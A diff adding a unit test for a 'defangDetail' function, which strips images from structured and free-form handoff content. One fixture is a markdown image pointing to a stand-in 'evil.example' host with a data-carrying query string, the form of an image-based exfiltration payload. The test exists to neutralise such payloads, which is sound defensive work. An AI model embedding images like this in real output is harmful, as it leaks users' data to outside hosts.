@@ -91,3 +91,21 @@ describe('trustNotice', () => {
     expect(trustNotice(undefined)).toBeNull();
   });
 });
+
+describe('defangDetail', () => {
+  it('removes images from every section and from free-form content', async () => {
+    const { defangDetail } = await import('../handoffTrust');
+    const detail = defangDetail({
+      structured: true,
+      done: ['![a](https://x.example/a.png)'],
+      not_done: [],
+      failing: [],
+      next: 'See ![s](https://evil.example/p.png?d=abc)',
+      commits: [],
+    });
+    expect(detail.structured && detail.next).toBe('See [image removed: evil.example]');
+    expect(detail.structured && detail.done[0]).toBe('[image removed: x.example]');
+    const free = defangDetail({ structured: false, content: '<img src="https://e.example/i.png">' });
+    expect(!free.structured && free.content).toBe('[image removed: e.example]');
+  });
+});
